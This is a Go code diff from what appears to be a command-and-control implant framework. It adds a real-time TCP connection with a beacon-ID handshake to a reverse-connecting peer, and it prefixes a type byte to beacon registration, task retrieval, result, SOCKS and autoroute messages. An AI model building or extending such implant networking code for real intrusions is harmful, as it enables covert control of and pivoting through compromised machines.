@@ -10,11 +10,12 @@ import (
 
 // Peer that connect to IP Port via reverse connection
 type TCPReversePeer struct {
-	Id       string
-	PeerType string
-	Conf     profiles.ProfileConfig
-	Ip       string
-	Port     string
+	Id           string
+	PeerType     string
+	Conf         profiles.ProfileConfig
+	Ip           string
+	Port         string
+	RealTimeConn net.Conn
 }
 
 // Http peer only require profile config
@@ -61,6 +62,41 @@ func (trp *TCPReversePeer) SetPeerID(s string) string {
 	return s
 }
 
+func (trp *TCPReversePeer) GetPeerAddress() string {
+	return trp.Ip + ":" + trp.Port
+}
+
+// Initialise TCP Dial COnn and return the underlying Conn
+// Need to handler error and multiple TCP for pivot
+func (trp *TCPReversePeer) GetRealTimeConn(beaconId string) (net.Conn, error) {
+	utils.Print("Getting TCP RealTimeConn --> ")
+	//if trp.RealTimeConn != nil {
+	//	return trp.RealTimeConn, nil
+	//}
+	url := trp.GetPeerAddress()
+	utils.Print("URL is --> ", url)
+
+	netConn, err := net.Dial("tcp", url)
+	if err != nil {
+		utils.Print("Error in dialing --> ", err)
+		return nil, err
+	}
+
+
+	// Do Handshake
+	// 3 is for initialize
+	t :=append([]byte{3}, []byte(beaconId)...) 
+	netConn.Write(append(t, '\n'))
+
+	buf := make([]byte, 2)
+	netConn.Read(buf)
+	utils.Print("Result of Handshake --> ", string(buf))
+
+	trp.RealTimeConn = netConn
+
+	return netConn, nil
+}
+
 // Send Data to Peer and get response
 func (trp *TCPReversePeer) SendRequest(dataToSend []byte) ([]byte, error) {
 	conn, err := net.Dial("tcp", trp.Ip+":"+trp.Port)
@@ -69,14 +105,14 @@ func (trp *TCPReversePeer) SendRequest(dataToSend []byte) ([]byte, error) {
 	}
 	defer conn.Close()
 
-    dataToSend = append(dataToSend, byte('\n'))
-    utils.Print("Will Hang TCP socket")
+	dataToSend = append(dataToSend, byte('\n'))
+	utils.Print("Will Hang TCP socket")
 	_, err = conn.Write(dataToSend)
 
-    utils.Print("TCP Socket hanged")
-//	resp, err := io.ReadAll(conn) // Read everything until connection closes
-    resp, _ := bufio.NewReader(conn).ReadBytes(byte('\n'))
-    utils.Print("You won't see me")
+	utils.Print("TCP Socket hanged")
+	//	resp, err := io.ReadAll(conn) // Read everything until connection closes
+	resp, _ := bufio.NewReader(conn).ReadBytes(byte('\n'))
+	utils.Print("You won't see me")
 	if err != nil {
 		panic(err)
 	}
@@ -87,23 +123,23 @@ func (trp *TCPReversePeer) SendRequest(dataToSend []byte) ([]byte, error) {
 }
 
 func (trp *TCPReversePeer) PrepareRegisterBeaconData(rawEnvelope []byte) ([]byte, error) {
-	return []byte(rawEnvelope), nil
+	return append([]byte{1}, rawEnvelope...), nil
 }
 
 func (trp *TCPReversePeer) PrepareRetreiveTasksData(rawEnvelope []byte) ([]byte, error) {
-	return []byte(rawEnvelope), nil
+	return append([]byte{1}, rawEnvelope...), nil
 }
 
 func (trp *TCPReversePeer) PrepareSendTaskResultsData(rawEnvelope []byte) ([]byte, error) {
-	return []byte(rawEnvelope), nil
+	return append([]byte{1}, rawEnvelope...), nil
 }
 
 func (hp *TCPReversePeer) PrepareSocksData(rawEnvelope []byte) ([]byte, error) {
-	return []byte(rawEnvelope), nil
+	return append([]byte{1}, rawEnvelope...), nil
 }
 
 func (hp *TCPReversePeer) PrepareAutorouteData(rawEnvelope []byte) ([]byte, error) {
-	return []byte(rawEnvelope), nil
+	return append([]byte{1}, rawEnvelope...), nil
 }
 
 func (trp *TCPReversePeer) CleanReqFromPeerProtocol(data []byte) (rawEnvelope []byte, err error) {
